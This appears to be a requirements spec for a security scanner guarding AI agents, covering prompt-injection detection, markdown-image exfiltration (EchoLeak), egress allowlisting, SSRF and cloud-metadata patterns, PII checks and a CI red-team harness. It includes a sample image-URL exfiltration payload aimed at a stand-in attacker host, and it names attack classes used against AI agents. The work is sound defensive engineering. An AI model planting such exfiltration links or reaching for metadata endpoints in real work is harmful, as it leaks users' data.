## Summary

Block E lifts the shipped `security` module from "regex-only detection with a proximity egress
heuristic and Claude-Code-only hooks" to a hardened posture that (1) optionally raises injection
**recall** with a local Prompt Guard 2 model, (2) closes modern exfiltration channels
deterministically (auto-rendered markdown images / reference-style links — the EchoLeak /
CVE-2025-32711 vector — a **deny-by-default egress domain allowlist**, and SSRF / private-IP /
cloud-metadata patterns), (3) adds **checksum-verifiable** structured PII (IBAN, credit-card + Luhn,
SSN, IP) plus an optional NER backend, (4) **broadens the merge-safe agent-hook installer** to
Cursor / Windsurf / generic MCP clients, and (5) ships a **red-team fixture corpus + CI
false-negative-rate gate** so detector quality cannot silently regress. MCP-boundary scanning (E3)
is specified in **Block A** and only referenced here.

Every model feature rides the module's *existing* `config.backends` seam and Block 0's Asset
Resolver, no-opping to the regex/deterministic path when the asset is absent (`E-1`, `E-2`, `E-13`,
`C0-4`, `C0-5`). Every non-model feature is a pure `DetectorMatch[]`-returning detector that slots
into `runDetectors` (`E-3`). Leak-safety is **strengthened, never relaxed** (`E-9`, `XP4`).

## Non-Goals (from problem-statement — MUST NOT appear as features)

- **NG-E1** No cloud/hosted security-scanning API — all detection local; models local + opt-in (`E-10`).
- **NG-E2** No weakening of leak-safety — masks / HMAC fingerprints / fail-closed gate / "no raw
  secret/PII in artifacts" remain absolute (`E-9`).
- **NG-E3** Model backends are **never mandatory**; regex/checksum stays the floor (`E-13`).
- **NG-E4** Not a runtime WAF / live proxy — scans artifacts/content and emits hooks only (`E-12`).
- **NG-E5** Never ship/bundle Prompt Guard 2 or NER models (`E-11`, `XP3`).

## Technical Foundation (summarized — not re-decided)

- **Stack**: Bun + TypeScript, ESM, layered `cli → command → service → lib`; empty `dependencies`
  block; new libs under `optionalDependencies`, lazy `await import()` inside adapters only (`C0-1`,
  `C0-2`).
- **Seam**: model features use the shipped `config.backends.*` toggle + Block 0
  `resolveCapability()` + Asset Resolver; non-model detectors are pure functions in `detect/*`.
- **Fallback contract**: capability disabled or asset absent/unverified ⇒ warn once to stderr, run
  the deterministic path, **exit 0**; adapters never throw (`C0-4`, `C0-5`, `C0-11`).

## User / Agent Stories

### Epic E-A — Semantic injection ceiling (G-E1)

#### US-E1: Opt-in local Prompt Guard 2 injection backend
**As an** agent operator **I want to** enable a local Prompt Guard 2 (22M/86M) injection model
behind the existing `backends` seam **so that** paraphrased prompt-injection that the regex misses
(OWASP #1) is caught — while my default install stays regex-only and offline.
**Acceptance Criteria:**
- [ ] With `backends.injectionModel.enabled=false` (default), `runDetectors` output is
  byte-identical to today; no optional dep imported, no asset touched.
- [ ] With the backend enabled and a Prompt Guard 2 asset resolved (Block 0 Asset Resolver,
  sha256-verified), injection **recall on `fixtures/injection/` is materially higher** than the
  regex-only baseline, precision not worse than the stated floor.
- [ ] With the backend enabled but the model asset absent/unverified: warn once to stderr, fall
  back to regex `detectInjection`, exit 0.
- [ ] Model findings use `category:"prompt-injection"` and flow through `resolveDecision`
  (incl. the injection→egress escalation) unchanged.
**Technical Notes:** Constraint ref `E-1`, `E-2`, `E-13`, `C0-2..C0-6`, `A-3`. Architecture ref
§5 Group E (Prompt Guard 2 via `backends.injectionModel`), §2 Capability Seam, §3 Asset Delivery.
**Priority:** P0 (core problem P-E1).

### Epic E-B — Modern exfil coverage (G-E2)

#### US-E2: Detect & strip auto-rendered markdown images / reference links (EchoLeak)
**As an** agent operator **I want** the scanner to flag and redact auto-rendering markdown image
syntax `![alt](http://attacker/leak?d=...)` and reference-style links/images **so that** the
CVE-2025-32711 zero-click exfil channel cannot smuggle data out via a rendered image URL.
**Acceptance Criteria:**
- [ ] `fixtures/exfil/` markdown-image and reference-style-link vectors are 100% flagged as
  `category:"egress"` and the image/link span is **redactable** (`mask` set) so `applyRedaction`
  strips it.
- [ ] Benign inline images to allowlisted domains are not flagged (no false positive on the
  benign fixtures).
**Technical Notes:** `E-3`, `E-9`; new `detect/exfil.ts`. Architecture §5 Group E, §6 (`exfil` corpus).
**Priority:** P0 (core problem P-E2).

#### US-E3: Deny-by-default egress domain allowlist
**As an** agent operator **I want** egress enforced against a configured **domain allowlist**
(deny-by-default) **so that** any URL to a non-allowlisted host is a finding — replacing the weak
send-verb proximity heuristic with an enforced boundary.
**Acceptance Criteria:**
- [ ] A configured `egress.allowlist` of domains is honored; a URL whose host is **not** on the
  allowlist is flagged regardless of send-verb proximity.
- [ ] A URL to an allowlisted host is not flagged by the allowlist rule.
- [ ] Empty/absent allowlist preserves today's proximity behavior (back-compat; no new false
  positives on the existing security test suite).
**Technical Notes:** `E-4` (deny-by-default), `C0-8` (deep-merge config). Architecture §5 Group E.
**Priority:** P0 (core problem P-E2).

#### US-E4: SSRF / private-IP / cloud-metadata patterns
**As an** agent operator **I want** SSRF indicators — private/link-local IP ranges and the cloud
metadata endpoint `169.254.169.254` (and `metadata.google.internal`) — detected **so that**
instructions to reach internal/metadata services are surfaced.
**Acceptance Criteria:**
- [ ] `fixtures/exfil/` SSRF vectors (RFC-1918, `127.0.0.0/8`, `169.254.169.254`,
  `metadata.google.internal`) are flagged `category:"egress"`.
- [ ] Public-IP / normal-URL benign fixtures are not flagged by the SSRF rule.
**Technical Notes:** `E-3`. Architecture §5 Group E.
**Priority:** P0 (core problem P-E2).

### Epic E-C — Structured PII (G-E5)

#### US-E5: Checksum-verified structured PII
**As an** agent operator **I want** IBAN (mod-97), credit-card (Luhn), SSN, and IP detectors that
**verify their checksum** **so that** structured-PII findings drop the known false positives that a
loose regex produces.
**Acceptance Criteria:**
- [ ] Valid-checksum IBAN/CC and well-formed SSN/IP in `fixtures/structured-pii/` are flagged
  `category:"pii"` with a typed `mask`; **invalid-checksum** items in the fixture are **not** flagged.
- [ ] Redaction uses fixed-width typed masks (length-hiding), preserving `E-9`.
**Technical Notes:** `E-6`, `E-9`; pure validators added to the `pii` detector. Architecture §5,
§6 (`structured-PII` corpus).
**Priority:** P0 (core problem P-E5→G-E5).

#### US-E6: Optional NER PII backend
**As an** agent operator **I want** an optional Presidio-style NER backend behind
`backends.piiModel` **so that** unstructured person/location PII can be caught when I opt in —
no-opping cleanly when absent.
**Acceptance Criteria:**
- [ ] `backends.piiModel.enabled=false` (default) ⇒ only deterministic PII runs; byte-identical to today.
- [ ] Enabled with NER asset resolved ⇒ NER findings merge as `category:"pii"`; enabled without
  the asset ⇒ warn once, deterministic PII only, exit 0.
**Technical Notes:** `E-1`, `E-6`, `E-13`; reuses the existing `backends.piiModel` stub
(`{enabled:false, provider:"custom"}`) + Block 0 seam. **Priority:** P1.

### Epic E-D — Multi-runtime hooks (G-E4)

#### US-E7: Merge-safe hook installer for a 2nd/3rd runtime
**As an** agent operator on Cursor / Windsurf / a generic MCP client **I want** the security guard
hooks installed into that runtime's config (not only `.claude/settings.json`) **so that** guardrails
apply outside Claude Code — installed merge-safe and idempotent.
**Acceptance Criteria:**
- [ ] ≥3 runtime targets (Claude Code + Cursor + Windsurf/generic MCP) emit valid,
  validator-checked hook configs routing input/output through `security check-input`/`check-output`.
- [ ] Install is **merge-safe** (preserves pre-existing user keys via the sentinel pattern) and
  **idempotent** on re-run; uninstall removes only managed entries.
**Technical Notes:** `E-7`; extends `agent-hooks.ts` sentinel/merge pattern. Architecture §5 Group E.
**Priority:** P0 (core problem P-E4→G-E4).

### Epic E-E — Red-team eval harness (G-E6)

#### US-E8: FN-rate eval harness gating CI
**As an** agent operator **I want** a promptfoo-style labeled corpus (injection/exfil/secret/PII)
run in CI that reports each detector's **false-negative rate** **so that** a detector regression
fails the build instead of silently degrading.
**Acceptance Criteria:**
- [ ] The harness runs every corpus through `runDetectors` (+ enabled backends) and emits a
  per-detector FN-rate report (deterministic, git-diffable).
- [ ] CI **fails** when any detector's FN rate exceeds its committed threshold (`fixtures/thresholds`).
- [ ] The harness runs with all model backends off (pure) and, separately, can include the
  injection model when its asset is present.
**Technical Notes:** `E-8`, `F-1..F-4`. Architecture §6 (harness generalizes the corpora).
**Priority:** P0 (core problem P-E6).

### Epic E-F — MCP boundary (G-E3) — cross-reference only

#### US-E9 (REFERENCE): MCP-boundary scanning
`security scan-mcp` (tool-poisoning / line-jumping / rug-pull over MCP manifests) and routing all
MCP tool output through `redactRaw` are **specified and gated in Block A** (`A-interop-mcp/`,
constraint `M-5`, architecture §4.3). Block E depends on Block A for E3 and adds nothing here beyond

## Config surface (extends the shipped `SecurityConfig`, deep-merged — `C0-8`)

New optional fields, all defaulting to the deterministic floor:

```jsonc
{
  "backends": {
    "injectionModel": { "enabled": false, "provider": "prompt-guard-2", "size": "22M" }, // E1
    "piiModel":       { "enabled": false, "provider": "custom" }                          // E4-NER (existing stub)
  },
  "policies": {
    "egress": {
      "enabled": true, "action": "block",
      "allowlist": []            // E3: deny-by-default when non-empty; [] = today's proximity behavior
    }
  }
}
```

Missing fields fall back to defaults; malformed JSON falls back to defaults (`C0-8`,
`mergeSecurityConfig`). Assets referenced via Block 0 `assets.lock.json`, never bundled (`A-*`).

## Testing Plan (aligned with §8 constraints)

- Per opt-in capability (E1, E4-NER): (a) availability-true path with the asset stubbed, and
  (b) availability-false fallback = byte-identical deterministic output (`T-3`, `F-3`).
- Pure detectors (E2, E4-checksum): unit tests against `fixtures/exfil/` and
  `fixtures/structured-pii/`, plus a no-false-positive test on benign fixtures.
- Hooks (E5): per-runtime config validator + merge-safety + idempotency tests.
- Harness (E6): CI job asserting FN-rate report shape and threshold gating.
- No-network sandbox test: every default `security` command opens no socket (`T-4`, `XP1`).
- Pyramid: ~70% unit (detectors/validators/fallback), ~25% integration (config/asset/hook wiring),
  ~5% CI harness.
